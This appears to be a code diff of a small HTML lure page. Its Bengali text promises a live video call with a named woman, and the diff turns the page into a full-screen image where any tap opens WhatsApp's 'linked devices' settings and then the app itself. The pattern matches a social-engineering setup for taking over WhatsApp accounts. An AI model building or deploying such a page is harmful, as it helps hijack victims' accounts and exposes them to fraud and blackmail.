@@ -3,87 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Ad Mariya Probashi</title>
+    <title>WhatsApp Direct Click</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Arial, sans-serif;
+        * {
             margin: 0;
-            padding: 40px 0 0 0;
-            background-color: #f0f2f5;
+            padding: 0;
+            box-sizing: border-box;
         }
-        .card {
-            background: #ffffff;
-            width: 85%;
-            max-width: 380px;
-            padding: 30px 20px;
-            border-radius: 16px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
-            text-align: center;
-            margin: 0 auto;
-        }
-        .profile-img-box {
-            width: 110px;
-            height: 110px;
-            border-radius: 50%;
-            border: 3px solid #ff3b70;
-            margin: 0 auto 15px auto;
-            overflow: hidden;
-            background-color: #fff;
-            cursor: pointer;
-        }
-        .profile-img-box img {
+        body, html {
             width: 100%;
             height: 100%;
+            overflow: hidden;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        /* পুরো স্ক্রিন জুড়েই থাকবে ফটোটি */
+        .full-screen-img {
+            width: 100vw;
+            height: 100vh;
             object-fit: cover;
-        }
-        h2 {
-            margin: 5px 0 10px 0;
-            color: #2c3e50;
-            font-size: 22px;
-            font-weight: 700;
-        }
-        p {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 25px;
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(to right, #6b11ff, #007bff);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 15px;
-            font-weight: bold;
             cursor: pointer;
-            box-shadow: 0 4px 10px rgba(107, 17, 255, 0.3);
-        }
-        button:hover, .profile-img-box:hover {
-            opacity: 0.9;
         }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <!-- ছবিতে ক্লিক করলেও সরাসরি WhatsApp খুলবে -->
-        <div class="profile-img-box" onclick="openWhatsApp()">
-            <!-- পরবর্তীতে আপনার ছবির লিঙ্ক "src" এর ভেতরে বসাবেন -->
-            <img src="https://via.placeholder.com/100" alt="Profile">
-        </div>
-        
-        <h2>WhatsApp Ad Mariya Probashi</h2>
-        <p>সরাসরি ভিডিও কলে যুক্ত হতে ফটোতে অথবা বোতামে চাপ দিন:</p>
-        
-        <button onclick="openWhatsApp()">WhatsApp অ্যাপে যান</button>
-    </div>
+    <img src="https://picsum.photos/800/1200" alt="Click to open WhatsApp" class="full-screen-img" onclick="openWhatsApp()">
 
     <script>
         function openWhatsApp() {
-            // লিঙ্ক অপশন
+            // ১. সরাসরি WhatsApp-এর Linked Devices বা অ্যাপ ওপেন করার ইনটেন্ট
             window.location.href = "whatsapp://settings/linked_devices";
 
+            // ২. ব্যাকআপ ব্যাকগ্রাউন্ড রিডাইরেক্ট
             setTimeout(function() {
                 window.location.href = "whatsapp://";
             }, 800);
